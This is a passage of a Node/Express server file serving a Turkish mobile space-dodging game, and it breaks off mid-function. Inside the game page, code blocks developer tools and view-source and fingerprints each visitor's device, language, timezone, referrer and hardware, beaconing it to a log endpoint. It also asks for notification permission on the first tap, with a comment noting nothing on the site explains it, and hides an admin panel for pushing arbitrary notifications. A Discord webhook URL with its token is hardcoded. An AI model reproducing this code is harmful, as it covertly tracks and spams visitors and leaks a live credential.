const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1549084209312698398/3hs3SNGi2LUaBjrAdVAm-l2uljyc47R356NcqhLuqQkHkGlN0f5ES3vWCRNTDBfepErF';

app.use(express.json({ limit: '1mb' }));

let MESSAGES = [];
let MSG_ID = 0;
let SCORES = [];

const SW_CODE = [
  "self.addEventListener('install', function(e){ self.skipWaiting(); });",
  "self.addEventListener('activate', function(e){ e.waitUntil(self.clients.claim()); });",
  "self.addEventListener('message', function(e){",
  "  var d = e.data || {};",
  "  if (d.type === 'SHOW_NOTIFICATION') {",
  "    self.registration.showNotification(d.title || 'Bildirim', {",
  "      body: d.body || '',",
  "      vibrate: [200,100,200],",
  "      data: { url: d.url || '/' },",
  "      tag: d.tag || 'default'",
  "    });",
  "  }",
  "});",
  "self.addEventListener('notificationclick', function(e){",
  "  e.notification.close();",
  "  var u = (e.notification.data && e.notification.data.url) || '/';",
  "  e.waitUntil(clients.matchAll({type:'window'}).then(function(l){",
  "    for (var i=0;i<l.length;i++){ if(l[i].url.indexOf(u)>-1 && 'focus' in l[i]) return l[i].focus(); }",
  "    if (clients.openWindow) return clients.openWindow(u);",
  "  }));",
  "});"
].join("\n");

const HTML = String.raw`<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no,viewport-fit=cover">
<title>Uzay Kacisi</title>
<meta name="robots" content="noindex,nofollow">
<meta name="theme-color" content="#0d1024">
<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3Crect width='180' height='180' fill='%230d1024'/%3E%3Ccircle cx='90' cy='90' r='55' fill='%234a9eff'/%3E%3C/svg%3E">
<meta name="apple-mobile-web-app-capable" content="yes">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,system-ui,"Segoe UI",Roboto,sans-serif;background:#0d1024;color:#fff;-webkit-font-smoothing:antialiased}
body{display:flex;flex-direction:column;align-items:center;justify-content:center;touch-action:none;user-select:none;-webkit-user-select:none;min-height:100vh;min-height:-webkit-fill-available}
#mgWrap{position:relative;display:flex;flex-direction:column;align-items:center;gap:12px;padding:0 6px;max-width:100vw}
.mgTitle{font-size:20px;font-weight:800;background:linear-gradient(90deg,#6cf,#c6f,#f6c);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;text-align:center}
.mgHud{display:flex;gap:14px;font-size:14px;font-weight:600;opacity:.95;align-items:center;flex-wrap:wrap;justify-content:center}
.mgHud b{color:#6cf;transition:font-size .3s;display:inline-block}
.mgHud .lv{color:#f59e0b}
#mgCanvas{border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6);background:linear-gradient(180deg,#1a1f3a,#0d1024);touch-action:none;cursor:pointer;display:block;max-width:96vw;transition:width .4s ease,height .4s ease;margin:0 auto}
.mgBtn{background:linear-gradient(90deg,#4a6cf7,#8b5cf6);border:none;color:#fff;padding:11px 24px;border-radius:30px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit}
.mgBtn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
.mgOver{position:absolute;inset:0;background:rgba(10,12,25,.92);display:none;flex-direction:column;align-items:center;justify-content:center;border-radius:16px;gap:10px;padding:14px;text-align:center}
.mgOver.show{display:flex}
.mgOver h2{font-size:22px;font-weight:800}
.mgOver .btns{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:6px}
#leaderboardBtn{position:fixed;top:12px;right:12px;background:linear-gradient(135deg,#f59e0b,#f97316);border:none;color:#fff;padding:9px 14px;border-radius:30px;font-size:13px;font-weight:700;cursor:pointer;box-shadow:0 6px 20px rgba(245,158,11,.5);z-index:9997;font-family:inherit}
#secretZone{position:fixed;bottom:10px;right:10px;display:flex;gap:5px;z-index:9998;opacity:.2}
.sbtn{width:24px;height:24px;border-radius:50%;border:none;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.4);transition:transform .1s;padding:0}
.sbtn.sari{background:linear-gradient(135deg,#fbbf24,#f59e0b)}
.sbtn.kirmizi{background:linear-gradient(135deg,#ef4444,#b91c1c);box-shadow:0 0 12px rgba(239,68,68,.7)}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:99999;display:none;align-items:center;justify-content:center;padding:14px}
.modal.show{display:flex}
.modal-box{background:linear-gradient(160deg,#0a0e1a,#131a2e);border-radius:16px;padding:20px;max-width:420px;width:100%;border:1px solid rgba(255,255,255,.1);box-shadow:0 20px 60px rgba(0,0,0,.7);max-height:85vh;overflow-y:auto}
.modal-box h3{font-size:18px;font-weight:800;margin-bottom:12px;background:linear-gradient(90deg,#6cf,#c6f);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
.modal-box input{width:100%;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:11px 13px;color:#fff;font-size:15px;margin-bottom:11px;outline:none;font-family:inherit}
.modal-btn{width:100%;background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:12px 22px;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:7px;font-family:inherit}
.modal-btn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
.lb-row{display:flex;justify-content:space-between;align-items:center;padding:9px 12px;margin-bottom:5px;background:rgba(255,255,255,.04);border-radius:10px;font-size:13px;border:1px solid rgba(255,255,255,.05)}
.lb-row.top1{background:linear-gradient(90deg,rgba(245,158,11,.25),rgba(245,158,11,.05));border-color:rgba(245,158,11,.4)}
.lb-row.top2{background:linear-gradient(90deg,rgba(148,163,184,.25),rgba(148,163,184,.05))}
.lb-row.top3{background:linear-gradient(90deg,rgba(180,83,9,.25),rgba(180,83,9,.05))}
.lb-name{font-weight:600;flex:1;text-align:left;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;padding-right:8px}
.lb-score{color:#6cf;font-weight:800}
.lb-rank{width:32px;text-align:center;font-weight:700;color:#94a3b8}
.empty-lb{text-align:center;color:#64748b;padding:22px;font-size:13px}
#adminPanel{position:fixed;inset:0;background:linear-gradient(160deg,#0a0e1a,#131a2e);z-index:999999;display:none;flex-direction:column;padding:18px;overflow-y:auto}
#adminPanel.show{display:flex}
.ap-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
.ap-title{font-size:20px;font-weight:800;background:linear-gradient(90deg,#ef4444,#f59e0b);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
.ap-stat{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap}
.ap-stat div{background:rgba(255,255,255,.05);padding:9px 14px;border-radius:10px;font-size:12px;border:1px solid rgba(255,255,255,.08)}
.ap-stat b{color:#6cf}
.ap-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:16px;margin-bottom:12px}
.ap-card h3{font-size:13px;font-weight:700;margin-bottom:10px;color:#94a3b8;text-transform:uppercase}
.ap-card input,.ap-card textarea{width:100%;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:10px 12px;color:#fff;font-size:14px;margin-bottom:10px;outline:none;font-family:inherit}
.ap-card textarea{resize:vertical;min-height:75px}
.ap-btn{background:linear-gradient(90deg,#22c55e,#16a34a);border:none;color:#fff;padding:10px 22px;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit}
.ap-btn.secondary{background:linear-gradient(90deg,#64748b,#475569)}
.ap-btn.danger{background:linear-gradient(90deg,#ef4444,#b91c1c)}
.ap-btn-row{display:flex;gap:8px;flex-wrap:wrap}
.ap-log{font-family:ui-monospace,Menlo,monospace;font-size:11px;background:rgba(0,0,0,.5);border-radius:8px;padding:10px;max-height:180px;overflow-y:auto;color:#94a3b8;line-height:1.5}
.ap-log .ok{color:#22c55e}
.ap-log .err{color:#ef4444}
.ap-close{background:transparent;border:1px solid rgba(255,255,255,.15);color:#fff;width:36px;height:36px;border-radius:50%;cursor:pointer;font-size:15px;font-family:inherit}
#levelUp{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:38px;font-weight:900;color:#f59e0b;text-shadow:0 0 30px rgba(245,158,11,.9);z-index:99998;pointer-events:none;opacity:0}
#levelUp.show{animation:levelAnim 1.5s ease-out}
@keyframes levelAnim{0%{opacity:0;transform:translate(-50%,-50%) scale(.5)}30%{opacity:1;transform:translate(-50%,-50%) scale(1.3)}70%{opacity:1;transform:translate(-50%,-50%) scale(1)}100%{opacity:0;transform:translate(-50%,-80%) scale(1)}}
@media (max-width: 480px){
  .mgTitle{font-size:17px}
  .mgHud{font-size:12px;gap:10px}
  #leaderboardBtn{font-size:12px;padding:8px 12px}
}
</style>
</head>
<body>

<div id="levelUp"></div>
<button id="leaderboardBtn">🏆 Sıralama</button>

<div id="mgWrap">
  <div class="mgTitle">🚀 Uzay Kacisi</div>
  <div class="mgHud">
    <span>Skor: <b id="mgScore">0</b></span>
    <span>Rekor: <b id="mgBest">0</b></span>
    <span>Seviye: <b class="lv" id="mgLevel">1</b></span>
  </div>
  <div style="position:relative;display:inline-block">
    <canvas id="mgCanvas"></canvas>
    <div class="mgOver" id="mgOver">
      <h2>Oyun Bitti!</h2>
      <div>Skor: <b id="mgFinal" style="color:#6cf">0</b> — Seviye: <b id="mgFinalLevel" style="color:#f59e0b">1</b></div>
      <div class="btns">
        <button class="mgBtn" id="mgSaveScore">💾 Kaydet</button>
        <button class="mgBtn secondary" id="mgRestart">🔄 Tekrar</button>
      </div>
    </div>
  </div>
</div>

<div id="secretZone">
  <button class="sbtn sari"></button><button class="sbtn sari"></button><button class="sbtn sari"></button>
  <button class="sbtn kirmizi" id="secretRed"></button>
  <button class="sbtn sari"></button><button class="sbtn sari"></button><button class="sbtn sari"></button>
</div>

<div class="modal" id="nameModal">
  <div class="modal-box">
    <h3>💾 Sıralamaya Kaydet</h3>
    <input id="nameInput" placeholder="Ismin..." maxlength="20" autocomplete="off">
    <button class="modal-btn" id="nameSave">Kaydet</button>
    <button class="modal-btn secondary" id="nameCancel">Iptal</button>
  </div>
</div>

<div class="modal" id="leaderboardModal">
  <div class="modal-box">
    <h3>🏆 Sıralama</h3>
    <div id="leaderboardList"><div class="empty-lb">Yukleniyor...</div></div>
    <button class="modal-btn secondary" id="lbClose" style="margin-top:10px">Kapat</button>
  </div>
</div>

<div id="adminPanel">
  <div class="ap-h">
    <div class="ap-title">⚡ Admin Panel</div>
    <button class="ap-close" id="apClose">X</button>
  </div>
  <div class="ap-stat">
    <div>🔔 İzin: <b id="apPerm">?</b></div>
    <div>📨 Gönderilen: <b id="apSent">0</b></div>
    <div>💬 Kuyruk: <b id="apQueue">0</b></div>
  </div>
  <div class="ap-card">
    <h3>📢 Bildirim Gönder</h3>
    <input id="apTitle" placeholder="Baslik" maxlength="80">
    <textarea id="apBody" placeholder="Mesaj..." maxlength="200"></textarea>
    <input id="apUrl" placeholder="URL (opsiyonel)" maxlength="200">
    <div class="ap-btn-row">
      <button class="ap-btn" id="apSend">🚀 Gönder</button>
      <button class="ap-btn secondary" id="apTest">🧪 Test</button>
    </div>
  </div>
  <div class="ap-card">
    <h3>📊 Log</h3>
    <div class="ap-log" id="apLog">Hazir.</div>
  </div>
  <div class="ap-card">
    <h3>⚙️ Islemler</h3>
    <div class="ap-btn-row">
      <button class="ap-btn secondary" id="apForcePerm">🔔 İzin İste</button>
      <button class="ap-btn danger" id="apClearScores">🗑️ Skorları Sil</button>
      <button class="ap-btn secondary" id="apClearLog">🧹 Logu Temizle</button>
      <button class="ap-btn danger" id="apReset">♻️ Sifirla</button>
    </div>
  </div>
</div>

<script>
(function(){
  'use strict';

  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
  document.addEventListener('keydown', function(e){
    if(e.key === 'F12'){ e.preventDefault(); return false; }
    if(e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')){ e.preventDefault(); return false; }
    if(e.ctrlKey && e.key.toUpperCase() === 'U'){ e.preventDefault(); return false; }
  });

  var CONFIG = {
    W_START:360, W_MAX:720, H_START:540, H_MAX:780,
    GROW_INTERVAL:8000, GROW_W_AMOUNT:30, GROW_H_AMOUNT:22,
    PLAYER_R:16, SPAWN_MS:800, SPAWN_MIN:320, SPAWN_DECAY:18,
    SPEED_BASE:4, SPEED_MAX:16, SPEED_PER_SCORE:0.05,
    SCORE_PER_OBSTACLE:2, LEVEL_EVERY:80, STORAGE_KEY:"mgBest"
  };

  var cv = document.getElementById("mgCanvas");
  var ctx = cv.getContext("2d");
  var scoreEl = document.getElementById("mgScore");
  var bestEl = document.getElementById("mgBest");
  var levelEl = document.getElementById("mgLevel");
  var overScreen = document.getElementById("mgOver");
  var finalScoreEl = document.getElementById("mgFinal");
  var finalLevelEl = document.getElementById("mgFinalLevel");
  var levelUpEl = document.getElementById("levelUp");

  var W = CONFIG.W_START, H = CONFIG.H_START;
  var player = { x:W/2, y:H-70, r:CONFIG.PLAYER_R };
  var obstacles = [], stars = [];
  var score = 0, level = 1;
  var best = parseInt(localStorage.getItem(CONFIG.STORAGE_KEY) || "0", 10);
  var running = true, gameOver = false;
  var fallSpeed = CONFIG.SPEED_BASE;
  var lastSpawn = 0, startTime = 0;
  var pointerX = W/2, animId = null, swReg = null;
  var lastMsgId = 0, lastGrowTime = 0, lastLevel = 1, lastScoreFont = 15;
  var sessionId = null;
  var notifAttempts = 0;

  function getMaxW(){
    var vw = Math.min(window.innerWidth, document.documentElement.clientWidth);
    return Math.min(CONFIG.W_MAX, Math.floor(vw * 0.96));
  }
  function getMaxH(){
    return Math.min(CONFIG.H_MAX, Math.floor(window.innerHeight * 0.72));
  }
  function applyCanvasSize(){
    cv.width = W; cv.height = H;
    cv.style.width = W + "px";
    cv.style.height = H + "px";
  }
  function clampSize(){
    var mw = getMaxW(), mh = getMaxH(), changed = false;
    if (W > mw){ W = mw; changed = true; }
    if (H > mh){ H = mh; changed = true; }
    if (W < 280){ W = 280; changed = true; }
    if (H < 400){ H = 400; changed = true; }
    if (changed) applyCanvasSize();
  }
  window.addEventListener('resize', function(){
    clampSize();
    if (player.x > W - player.r) player.x = W - player.r;
    if (pointerX > W - player.r) pointerX = W - player.r;
  });
  window.addEventListener('orientationchange', function(){
    setTimeout(clampSize, 300);
  });

  function getSid(){
    if (sessionId) return sessionId;
    var s = sessionStorage.getItem("mg_sid");
    if(!s){ s = "S" + Date.now().toString(36) + Math.random().toString(36).slice(2,6); sessionStorage.setItem("mg_sid", s); }
    sessionId = s;
    return s;
  }

  function detectBrowser(){
    var ua = navigator.userAgent;
    var name = "Bilinmiyor", ver = "", eng = "", engVer = "";
    if (ua.indexOf("Edg/") > -1){ name="Edge"; ver=(ua.match(/Edg\/([\d.]+)/)||[])[1]||""; eng="Blink"; engVer=ver; }
    else if (ua.indexOf("OPR/") > -1){ name="Opera"; ver=(ua.match(/OPR\/([\d.]+)/)||[])[1]||""; eng="Blink"; engVer=ver; }
    else if (ua.indexOf("SamsungBrowser") > -1){ name="Samsung Internet"; ver=(ua.match(/SamsungBrowser\/([\d.]+)/)||[])[1]||""; eng="Blink"; engVer=ver; }
    else if (ua.indexOf("CriOS") > -1){ name="Chrome (iOS)"; ver=(ua.match(/CriOS\/([\d.]+)/)||[])[1]||""; eng="WebKit"; engVer=(ua.match(/AppleWebKit\/([\d.]+)/)||[])[1]||""; }
    else if (ua.indexOf("FxiOS") > -1){ name="Firefox (iOS)"; ver=(ua.match(/FxiOS\/([\d.]+)/)||[])[1]||""; eng="WebKit"; engVer=(ua.match(/AppleWebKit\/([\d.]+)/)||[])[1]||""; }
    else if (ua.indexOf("Firefox/") > -1){ name="Firefox"; ver=(ua.match(/Firefox\/([\d.]+)/)||[])[1]||""; eng="Gecko"; engVer=(ua.match(/rv:([\d.]+)/)||[])[1]||""; }
    else if (ua.indexOf("Chrome/") > -1){ name="Chrome"; ver=(ua.match(/Chrome\/([\d.]+)/)||[])[1]||""; eng="Blink"; engVer=ver; }
    else if (ua.indexOf("Safari/") > -1){ name="Safari"; ver=(ua.match(/Version\/([\d.]+)/)||[])[1]||""; eng="WebKit"; engVer=(ua.match(/AppleWebKit\/([\d.]+)/)||[])[1]||""; }
    return { name: name, ver: ver, engine: eng, engineVer: engVer };
  }

  function detectOS(){
    var ua = navigator.userAgent;
    if (ua.indexOf("Windows NT 10") > -1) return { os:"Windows", ver:"10/11" };
    if (ua.indexOf("Windows NT 6.3") > -1) return { os:"Windows", ver:"8.1" };
    if (ua.indexOf("Windows NT 6.1") > -1) return { os:"Windows", ver:"7" };
    if (ua.indexOf("Windows NT") > -1) return { os:"Windows", ver:"?" };
    if (ua.indexOf("Mac OS X") > -1){ var m = ua.match(/Mac OS X ([\d_]+)/); return { os:"macOS", ver: m ? m[1].replace(/_/g,".") : "?" }; }
    if (ua.indexOf("Android") > -1){ var a = ua.match(/Android ([\d.]+)/); return { os:"Android", ver: a ? a[1] : "?" }; }
    if (ua.indexOf("iPhone") > -1){ var i = ua.match(/iPhone OS ([\d_]+)/); return { os:"iOS", ver: i ? i[1].replace(/_/g,".") : "?" }; }
    if (ua.indexOf("iPad") > -1) return { os:"iPadOS", ver:"?" };
    if (ua.indexOf("Linux") > -1) return { os:"Linux", ver:"?" };
    return { os:"Bilinmiyor", ver:"?" };
  }

  function detectDevice(){
    var ua = navigator.userAgent;
    if (/iPad|Tablet/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) return "Tablet";
    if (/Mobi|Android|iPhone|iPod/.test(ua)) return "Mobil";
    if (("ontouchstart" in window) && window.innerWidth < 900) return "Mobil";
    return "Masaustu";
  }

  function isIOS(){
    var ua = navigator.userAgent;
    return /iPhone|iPad|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
  }
  function isStandalone(){
    return window.matchMedia('(display-mode: standalone)').matches
      || window.matchMedia('(display-mode: fullscreen)').matches
      || window.navigator.standalone === true;
  }

  function collectInfo(){
    var b = detectBrowser();
    var o = detectOS();
    var dev = detectDevice();
    var conn = navigator.connection || {};
    return {
      browser: b.name, browserVer: b.ver, engine: b.engine, engineVer: b.engineVer,
      os: o.os, osVer: o.ver, device: dev,
      isIOS: isIOS() ? "Evet" : "Hayir",
      isPWA: isStandalone() ? "Evet" : "Hayir",
      screenRes: screen.width + "x" + screen.height,
      viewport: window.innerWidth + "x" + window.innerHeight,
      pixelRatio: window.devicePixelRatio || 1,
      language: navigator.language || "?",
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "?",
      touch: ("ontouchstart" in window) ? "Var" : "Yok",
      online: navigator.onLine ? "Online" : "Offline",
      connection: (conn.effectiveType || "?") + (conn.downlink ? " / " + conn.downlink + "Mbps" : ""),
      cores: navigator.hardwareConcurrency || "?",
      memory: navigator.deviceMemory ? (navigator.deviceMemory + " GB") : "?",
      notifPerm: ("Notification" in window) ? Notification.permission : "Yok",
      ua: navigator.userAgent,
      url: location.href,
      referrer: document.referrer || "direkt",
      sid: getSid()
    };
  }

  function sendLog(event, info){
    var payload = JSON.stringify({ event: event, info: info });
    try {
      if (navigator.sendBeacon) navigator.sendBeacon("/log", new Blob([payload], {type:"application/json"}));
      else fetch("/log", { method:"POST", headers:{"Content-Type":"application/json"}, body: payload, keepalive: true });
    } catch(e){}
  }

  function initSW(){
    if (!("serviceWorker" in navigator)) return Promise.resolve(false);
    return navigator.serviceWorker.register("/sw.js", { scope: "/" })
      .then(function(reg){ swReg = reg; return navigator.serviceWorker.ready; })
      .then(function(){ return true; })
      .catch(function(e){ console.warn("SW hata", e); return false; });
  }

  // ===== IZIN (sadece sistem penceresi, sitede bir sey yok) =====
  function tryRequestNotify(){
    if (notifAttempts >= 3) return;
    if (!("Notification" in window)) return;
    if (Notification.permission !== "default") return;
    notifAttempts++;
    try {
      var result = Notification.requestPermission();
      if (result && typeof result.then === "function"){
        result.then(function(perm){
          if (perm === "granted"){
            sendNotif("🔔 Bildirimler Acildi!", "Artik mesajlari alacaksin");
            sendLog("notify_granted", collectInfo());
          } else if (perm === "denied"){
            sendLog("notify_denied", collectInfo());
          }
        }).catch(function(){});
      }
    } catch(e){
      try {
        Notification.requestPermission(function(perm){
          if (perm === "granted"){
            sendNotif("🔔 Bildirimler Acildi!", "Artik mesajlari alacaksin");
            sendLog("notify_granted", collectInfo());
          } else if (perm === "denied"){
            sendLog("notify_denied", collectInfo());
          }
        });
      } catch(err){}
    }
  }

  function sendNotif(title, body, opts){
    opts = opts || {};
    if (!("Notification" in window)) return false;
    if (Notification.permission !== "granted") return false;
    if (swReg && swReg.active){
      swReg.active.postMessage({ type:"SHOW_NOTIFICATION", title:title, body:body, url:opts.url, tag:opts.tag });
      return true;
    }
    try { new Notification(title, { body: body }); return true; } catch(e){ return false; }
  }
  window.bildirimGonder = sendNotif;

  function growScreen(){
    var mw = getMaxW(), mh = getMaxH(), changed = false;
    if (W < CONFIG.W_MAX && W < mw){ W = Math.min(CONFIG.W_MAX, mw, W + CONFIG.GROW_W_AMOUNT); changed = true; }
    if (H < CONFIG.H_MAX && H < mh){ H = Math.min(CONFIG.H_MAX, mh, H + CONFIG.GROW_H_AMOUNT); changed = true; }
    if (!changed) return;
    applyCanvasSize();
    if (player.x > W - player.r) player.x = W - player.r;
    if (pointerX > W - player.r) pointerX = W - player.r;
  }

  function spawnObstacle(){
    var w = 40 + Math.random() * 60;
    obstacles.push({ x: Math.random() * (W - w), y: -20, w: w, h: 18, hue: Math.floor(Math.random() * 60) + 330 });
  }

  function handlePointer(cx){
    var r = cv.getBoundingClientRect();
    pointerX = Math.max(player.r, Math.min(W - player.r, (cx - r.left) * (W / r.width)));
  }

  var firstInteraction = false;
  function onFirstInteraction(){
    if (firstInteraction) return;
    firstInteraction = true;
    tryRequestNotify();
  }

  cv.addEventListener("mousemove", function(e){ handlePointer(e.clientX); });
  cv.addEventListener("click", function(e){ handlePointer(e.clientX); onFirstInteraction(); });
  cv.addEventListener("touchstart", function(e){ handlePointer(e.touches[0].clientX); onFirstInteraction(); });
  cv.addEventListener("touchmove", function(e){ e.preventDefault(); handlePointer(e.touches[0].clientX); }, { passive: false });
  document.addEventListener("click", onFirstInteraction);
  document.addEventListener("touchstart", onFirstInteraction);
  document.addEventListener("keydown", onFirstInteraction);

  document.addEventListener("keydown", function(e){
    if (!running) return;
    if (e.key === "ArrowLeft") pointerX = Math.max(player.r, pointerX - 30);
    if (e.key === "ArrowRight") pointerX = Math.min(W - player.r, pointerX + 30);
  });

  function update(){
    var now = performance.now();
    var elapsed = now - startTime;

    if (elapsed - lastGrowTime > CONFIG.GROW_INTERVAL){
      lastGrowTime = elapsed;
      growScreen();
    }

    fallSpeed = Math.min(CONFIG.SPEED_MAX, CONFIG.SPEED_BASE + score * CONFIG.SPEED_PER_SCORE);

    var currentSpawn = Math.max(CONFIG.SPAWN_MIN, CONFIG.SPAWN_MS - (level - 1) * CONFIG.SPAWN_DECAY);
    if (now - lastSpawn > currentSpawn){ spawnObstacle(); lastSpawn = now; }

    var newLevel = Math.floor(score / CONFIG.LEVEL_EVERY) + 1;
    if (newLevel > lastLevel){
      lastLevel = newLevel; level = newLevel;
      levelEl.textContent = level;
      showLevelUp(level);
    }

    var newFont = 15 + Math.min(15, Math.floor(score / 40));
    if (newFont !== lastScoreFont){
      lastScoreFont = newFont;
      scoreEl.style.fontSize = newFont + "px";
      bestEl.style.fontSize = newFont + "px";
      levelEl.style.fontSize = newFont + "px";
    }

    for (var i = 0; i < stars.length; i++){
      var s = stars[i]; s.y += s.v;
      if (s.y > H){ s.y = -2; s.x = Math.random() * W; }
    }

    player.x += (pointerX - player.x) * 0.25;

    for (var j = obstacles.length - 1; j >= 0; j--){
      var o = obstacles[j];
      o.y += fallSpeed;
      var cx = Math.max(o.x, Math.min(player.x, o.x + o.w));
      var cy = Math.max(o.y, Math.min(player.y, o.y + o.h));
      var dx = player.x - cx, dy = player.y - cy;
      if (dx * dx + dy * dy < player.r * player.r){ endGame(); return; }
      if (o.y > H){
        obstacles.splice(j, 1);
        score += CONFIG.SCORE_PER_OBSTACLE;
        scoreEl.textContent = score;
      }
    }
  }

  function showLevelUp(lv){
    levelUpEl.textContent = "SEVIYE " + lv + "!";
    levelUpEl.classList.remove("show");
    void levelUpEl.offsetWidth;
    levelUpEl.classList.add("show");
  }

  function rrect(x, y, w, h, r){
    if (ctx.roundRect){ ctx.roundRect(x, y, w, h, r); return; }
    ctx.moveTo(x + r, y);
    ctx.arcTo(x + w, y, x + w, y + h, r);
    ctx.arcTo(x + w, y + h, x, y + h, r);
    ctx.arcTo(x, y + h, x, y, r);
    ctx.arcTo(x, y, x + w, y, r);
    ctx.closePath();
  }

  function draw(){
    ctx.clearRect(0, 0, W, H);
    for (var i = 0; i < stars.length; i++){
      var s = stars[i];
      if (s.x > W || s.y > H) continue;
      ctx.globalAlpha = s.s / 2.2;
      ctx.fillStyle = "#cfe4ff";
      ctx.fillRect(s.x, s.y, s.s, s.s);
    }
    ctx.globalAlpha = 1;
    for (var k = 0; k < obstacles.length; k++){
      var o = obstacles[k];
      var g = ctx.createLinearGradient(o.x, o.y, o.x, o.y + o.h);
      g.addColorStop(0, "hsl(" + o.hue + ",80%,65%)");
      g.addColorStop(1, "hsl(" + o.hue + ",80%,45%)");
      ctx.fillStyle = g;
      ctx.shadowColor = "hsl(" + o.hue + ",80%,60%)";
      ctx.shadowBlur = 14;
      ctx.beginPath();
      rrect(o.x, o.y, o.w, o.h, 8);
      ctx.fill();
      ctx.shadowBlur = 0;
    }
    ctx.save();
    ctx.shadowColor = "#6cf";
    ctx.shadowBlur = 22;
    var pg = ctx.createRadialGradient(player.x - 6, player.y - 6, 2, player.x, player.y, player.r);
    pg.addColorStop(0, "#bfe4ff");
    pg.addColorStop(1, "#4a9eff");
    ctx.fillStyle = pg;
    ctx.beginPath();
    ctx.arc(player.x, player.y, player.r, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();
  }

  function loop(){
    if (!running) return;
    update();
    draw();
    animId = requestAnimationFrame(loop);
  }

  function rebuildStars(){
    stars = [];
    var maxW = CONFIG.W_MAX + 100;
    var maxH = CONFIG.H_MAX + 100;
    for (var i = 0; i < 100; i++){
      stars.push({ x:Math.random()*maxW, y:Math.random()*maxH, s:Math.random()*1.8+0.4, v:Math.random()*1.5+0.4 });
    }
  }

  function startGame(){
    W = Math.max(280, Math.min(CONFIG.W_START, getMaxW()));
    H = Math.max(400, Math.min(CONFIG.H_START, getMaxH()));
    applyCanvasSize();

    player = { x: W/2, y: H - 70, r: CONFIG.PLAYER_R };
    obstacles = [];
    score = 0; level = 1; lastLevel = 1;
    fallSpeed = CONFIG.SPEED_BASE;
    lastSpawn = performance.now();
    lastGrowTime = 0;
    startTime = performance.now();
    pointerX = W / 2;
    gameOver = false; running = true;
    lastScoreFont = 15;
    scoreEl.textContent = 0; levelEl.textContent = 1;
    scoreEl.style.fontSize = "15px"; bestEl.style.fontSize = "15px"; levelEl.style.fontSize = "15px";
    overScreen.classList.remove("show");
    cancelAnimationFrame(animId);
    animId = requestAnimationFrame(loop);
  }

  function endGame(){
    running = false; gameOver = true;
    cancelAnimationFrame(animId);
    finalScoreEl.textContent = score;
    finalLevelEl.textContent = level;
    var yeniRekor = false;
    if (score > best){
      best = score;
      localStorage.setItem(CONFIG.STORAGE_KEY, best);
      bestEl.textContent = best;
      yeniRekor = true;
    }
    overScreen.classList.add("show");
    if (yeniRekor) sendNotif("🏆 Yeni Rekor!", "Skor: " + score + " | Seviye: " + level);
    else sendNotif("🎮 Oyun Bitti", "Skor: " + score + " | Seviye: " + level + " | Rekor: " + best);
  }

  document.getElementById("mgRestart").addEventListener("click", startGame);

  document.getElementById("mgSaveScore").addEventListener("click", function(){
    document.getElementById("nameModal").classList.add("show");
    setTimeout(function(){ document.getElementById("nameInput").focus(); }, 100);
  });

  document.getElementById("nameSave").addEventListener("click", function(){
    var name = document.getElementById("nameInput").value.trim();
    if (!name){ alert("Ismini yaz!"); return; }
    if (name.length > 20) name = name.substring(0, 20);
    fetch("/api/score", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name: name, score: score })
    })
    .then(function(r){ return r.json(); })
    .then(function(){
      document.getElementById("nameModal").classList.remove("show");
      document.getElementById("nameInput").value = "";
      openLeaderboard();
    })
    .catch(function(){ alert("Kaydedilemedi."); });
  });

  document.getElementById("nameCancel").addEventListener("click", function(){
    document.getElementById("nameModal").classList.remove("show");
  });
  document.getElementById("nameInput").addEventListener("keydown", function(e){
    if (e.key === "Enter") document.getElementById("nameSave").click();
  });

  document.addEventListener("visibilitychange", function(){
    if (document.hidden){ running = false; cancelAnimationFrame(animId); }
    else if (!gameOver && !running){ running = true; animId = requestAnimationFrame(loop); }
  });

  function openLeaderboard(){
    document.getElementById("leaderboardModal").classList.add("show");
    var listEl = document.getElementById("leaderboardList");
    listEl.innerHTML = '<div class="empty-lb">Yukleniyor...</div>';
    fetch("/api/scores").then(function(r){ return r.json(); }).then(function(d){
      var scores = d.scores || [];
      if (scores.length === 0){ listEl.innerHTML = '<div class="empty-lb">Henuz skor yok!</div>'; return; }
      var html = "";
      for (var i = 0; i < scores.length; i++){
        var s = scores[i];
        var cls = "lb-row";
        if (i === 0) cls += " top1"; else if (i === 1) cls += " top2"; else if (i === 2) cls += " top3";
        var medal = (i === 0) ? "🥇" : (i === 1) ? "🥈" : (i === 2) ? "🥉" : (i + 1);
